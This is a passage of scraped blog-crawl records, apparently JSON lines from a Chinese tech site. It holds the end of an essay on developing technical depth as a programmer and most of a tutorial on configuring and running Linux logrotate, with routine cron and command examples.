次。</p>\n<p>正如这位去面试的读者，从简历上看确实是能看到他辉煌的项目经历，在经历之下会发现简历中没有深入的地方。有些虽然写的很有技术，但是确实只是在使用API的程度而已；有些解决问题的方式很有技巧，但还不成体系。</p>\n<p>可惜没有多走两步，没有去研究和扩展。</p>\n<h3>那么如何改变呢？</h3>\n<p>对方也在问我这个问题，而且很迫切，迫切到希望我今天说明白之后他明天面试就可以变得深入。</p>\n<p>我很无奈且直接的说明了这个多半不可能。如果是可能的话，别人也可以很快掌握核心技术变得很深入。但长期的话我认为是可能的，比如给自己半年的时间，对以前项目中的某一项技术框架进行学习扩展和实践。最好能利用一下你目前所在公司的资源，比如做这个框架的项目组，和他们搞好关系，向他们学习、和他们讨论你遇到的每一个问题。</p>\n<p>但是绝对没有其他的方式，可以让你通过看一下或者临时准备一下就提升到有深度的地步。如果你能做到，必然是已经在某方面是个很精深的高手了，自然可以忽略我说的话。</p>\n<h3>没有深度的原因</h3>\n<p>我们没有技术深度，最重要的原因有两个：第一是回避问题，第二是没有兴趣。</p>\n<p>当我们在工作中遇到问题的时候，第一选择往往是回避它，不管是从设计上还是从技术上，或者找到其他的替代方案，如可使用别人的开源库，使用别人造出来的轮子。这样做无可厚非，但如果我们想有更深一步的提升或者更有技术深度的话，我们一定要把这个问题搞明白，至少把别人是怎么能解决这个问题的思路和方式搞明白。</p>\n<p>第二关于兴趣，很多人没有往更深入的地方多走两步，很重要的一点就是没有兴趣，一点都不好奇。如果我们遇到一些很有意思的解决方案、框架或者一些诡异的问题，但我们完全不想去“招惹”它们，唯恐避之而不及，自然，我们也失去了在这些点上有突破与深入的机会。</p>\n<h3>自己该在哪个点上深入呢？</h3>\n<p>我们工作了很多年之后，技术一定是需要具有一定的深度和广度的，广度自然不必说，你也会明白它的必要性。深度最好是跟自己的兴趣或者比较接近的工作模块相关，如果你在公司相关的模块深入，你可以利用更多的资源。或者是你感兴趣的模块的话，即使没有资源，由于你很有兴趣，你也会有办法去找到你需要用的东西的。</p>\n<p>我们永远不缺方法。</p>\n<h3>带领和被带领</h3>\n<p>技术的深度是一个带领和被带领的关系。</p>\n<p>关于这点我本身就有一个深刻的体会，在我刚开始做Android开发的时候，我的工作是去维护Android自带的系统应用，客户提的问题或者进行二次开发，我都能很好的解决。然后就会有一些空闲的时间，反正也是闲着，我就找了个系统应用里面最简单的一个应用（记事本）练练手。</p>\n<p>我想既然这么简单，那我就自己照着写一个吧，就从零开始实现一个记事本应用。当我开始写时，颠覆了我对安卓应用的理解，我发现以前认为懂的地方自己都没懂，我遇到了很多毫无头绪的问题，就这么一个简单的应用，我要靠不停的对照原版的代码实现才能发现自己的问题所在，然后才确信真正的做和看中间的差距有多大。</p>\n<p>如果你只是在别人的基础上去做事情解决问题，哪怕你觉得自己想出了很好的点子，好像灵光一闪，很巧妙的解决了客户的问题，但其实这只是一种技巧，在怎么建造这个应用、构架和设计组织这种大的方向上，你并没有多大的实质进步。</p>\n<p><strong>这个时候你只是一个跟随者，你是被别人的源码带领着的。</strong></p>\n<p>即使你看过和使用过很多应用框架，但纸上得来终觉浅，只是添加了些许纸上谈兵的资本。你始终是一个被带领的人，带领者给你定好了框架，给你定好了一条大路，然后你在他定好的道路上耍了一下滑头，却生出一种假象：觉得自己很厉害，很有技巧。</p>\n<p>而你自己写一个这样的框架，或者去设计一个思路，去指定一个方向和路径的话，你会发现它没有你想象中的那么简单。</p>\n<blockquote><p>你是要做带领别人的人？还是要做一个被带领的人呢？</p></blockquote>\n<h3>小结</h3>\n<p>没有技术深度是大多程序员的一种常态。</p>\n<p>并不能说这是一种坏的或者好的现象，这只是一种合理的状态，因为很多工作，很多人从事的项目并不需要有多少技术深度。即使你有深度，你也可能发现用不上。对于大多数人，合乎理性的做法不是去追求技术深度而是够用就可以了。</p>\n<p>但转到个人的话就不一样了，在技术上你需要够用，但是在某方面上你需要有一定的深度，以突出你自己的学习理解和运用的能力，而且这个能力是要有成功案例来背书。</p>\n<p>特别是当你成为一个资深的工程师的时候，很多公司并不希望你还是那样平庸，没有深度。虽然你会纳闷，我就算有深度你们也不一定用得上呀？然而到了这个级别的人需求量并不像初中级开发那么多，公司更理性和稳妥的做法是选择有深度的人，不是吗？</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110992\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110992votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110992\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 6 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx2.sinaimg.cn/mw690/7cc829d3gy1fgcozdst5qj20ba078t94.jpg"], "fav_nums": 6, "comment_nums": 1, "create_date": "2017/06/07", "praise_nums": 2}
{"tags": "logrotate,日志,IT技术,Linux", "front_image_path": "full/11a48b07810c909fd0ce4f50b3b33355d43f04e2.jpg", "title": "Linux 下 logrotate 日志轮询操作梳理", "url_object_id": "e975392587f1caa2451dc67f1c110a3e", "url": "http://blog.jobbole.com/111385/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/kevingrace/p/6307298.html\">散尽浮华</a>   </div><p>对于 Linux 系统安全来说，日志文件是极其重要的工具。不知为何，我发现很多运维同学的服务器上都运行着一些诸如每天切分 Nginx日志之类的 CRON 脚本，大家似乎遗忘了 Logrotate，争相发明自己的轮子，这真是让人沮丧啊！就好比明明身边躺着现成的性感美女，大家却忙着自娱自乐，罪过！</p>\n<p>logrotate 程序是一个日志文件管理工具。用于分割日志文件，删除旧的日志文件，并创建新的日志文件，起到“转储”作用。可以节省磁盘空间。下面就对 logrotate 日志轮转操作做一梳理记录。</p>\n<div id=\"cnblogs_post_body\">\n<p><strong>1）配置文件介绍</strong></p>\n<p>Linux系统默认安装logrotate工具，它默认的配置文件在：</p>\n<blockquote><p>/etc/logrotate.conf<br>\n/etc/logrotate.d/</p></blockquote>\n<p>logrotate.conf 才主要的配置文件，logrotate.d 是一个目录，该目录里的所有文件都会被主动的读入/etc/logrotate.conf中执行。</p>\n<p>另外，如果 /etc/logrotate.d/ 里面的文件中没有设定一些细节，则会以/etc/logrotate.conf这个文件的设定来作为默认值。</p>\n<p>Logrotate是基于CRON来运行的，其脚本是/etc/cron.daily/logrotate，日志轮转是系统自动完成的。实际运行时，Logrotate会调用配置文件/etc/logrotate.conf。可以在/etc/logrotate.d目录里放置自定义好的配置文件，用来覆盖Logrotate的缺省值。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45b69682034192\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@huanqiu_web1 ~]# cat /etc/cron.daily/logrotate \r\n#!/bin/sh\r\n\r\n/usr/sbin/logrotate /etc/logrotate.conf &gt;/dev/null 2&gt;&amp;1\r\nEXITVALUE=$?\r\nif [ $EXITVALUE != 0 ]; then\r\n    /usr/bin/logger -t logrotate \"ALERT exited abnormally with [$EXITVALUE]\"\r\nfi\r\nexit 0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b69682034192-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b69682034192-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b69682034192-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b69682034192-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b69682034192-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b69682034192-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b69682034192-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b69682034192-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b69682034192-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45b69682034192-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_web1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># cat /etc/cron.daily/logrotate </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b69682034192-2\"><span class=\"crayon-p\">#!/bin/sh</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b69682034192-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b69682034192-4\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">conf</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b69682034192-5\"><span class=\"crayon-v\">EXITVALUE</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">?</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b69682034192-6\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">EXITVALUE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">then</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b69682034192-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logger</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">t</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">logrotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"ALERT exited abnormally with [$EXITVALUE]\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b69682034192-8\"><span class=\"crayon-e\">fi</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b69682034192-9\"><span class=\"crayon-i\">exit</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p>\n</p></div>\n<p>如果等不及cron自动执行日志轮转，想手动强制切割日志，需要加-f参数；不过正式执行前最好通过Debug选项来验证一下（-d参数），这对调试也很重要：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45b74747981869\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/sbin/logrotate -f /etc/logrotate.d/nginx\r\n# /usr/sbin/logrotate -d -f /etc/logrotate.d/nginx</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b74747981869-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b74747981869-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45b74747981869-1\"><span class=\"crayon-p\"># /usr/sbin/logrotate -f /etc/logrotate.d/nginx</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b74747981869-2\"><span class=\"crayon-p\"># /usr/sbin/logrotate -d -f /etc/logrotate.d/nginx</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><strong>logrotate 命令格式：</strong></p>\n<blockquote><p>logrotate [OPTION…] &lt;configfile&gt;</p>\n<p>-d, –debug ：debug模式，测试配置文件是否有错误。<br>\n-f, –force ：强制转储文件。<br>\n-m, –mail=command ：压缩日志后，发送日志到指定邮箱。<br>\n-s, –state=statefile ：使用指定的状态文件。<br>\n-v, –verbose ：显示转储过程。</p></blockquote>\n<p>根据日志切割设置进行操作，并显示详细信息：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45b79375942742\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@huanqiu_web1 ~]# /usr/sbin/logrotate -v /etc/logrotate.conf\r\n[root@huanqiu_web1 ~]# /usr/sbin/logrotate -v /etc/logrotate.d/php</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b79375942742-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b79375942742-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45b79375942742-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_web1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># /usr/sbin/logrotate -v /etc/logrotate.conf</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b79375942742-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_web1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># /usr/sbin/logrotate -v /etc/logrotate.d/php</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>根据日志切割设置进行执行，并显示详细信息,但是不进行具体操作，debug模式</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45b7d469543186\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@huanqiu_web1 ~]# /usr/sbin/logrotate -d /etc/logrotate.conf\r\n[root@huanqiu_web1 ~]# /usr/sbin/logrotate -d /etc/logrotate.d/nginx</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b7d469543186-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b7d469543186-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45b7d469543186-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_web1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># /usr/sbin/logrotate -d /etc/logrotate.conf</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b7d469543186-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">huanqiu_web1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># /usr/sbin/logrotate -d /etc/logrotate.d/nginx</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>查看各log文件的具体执行情况</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45b80943942485\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@fangfull_web1 ~]# cat /var/lib/logrotate.status</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b80943942485-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45b80943942485-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">fangfull_web1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># cat /var/lib/logrotate.status</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><strong>2）切割介绍</strong></p>\n<p>比如以系统日志/var/log/message做切割来简单说明下：</p>\n<ul>\n<li>第一次执行完rotate(轮转)之后，原本的messages会变成messages.1，而且会制造一个空的messages给系统来储存日志；</li>\n<li>第二次执行之后，messages.1会变成messages.2，而messages会变成messages.1，又造成一个空的messages来储存日志！</li>\n</ul>\n<p>如果仅设定保留三个日志（即轮转3次）的话，那么执行第三次时，则 messages.3这个档案就会被删除，并由后面的较新的保存日志所取代！也就是会保存最新的几个日志。</p>\n<p>日志究竟轮换几次，这个是根据配置文件中的dateext 参数来判定的。</p>\n<p>看下logrotate.conf配置：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45b84494575222\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" 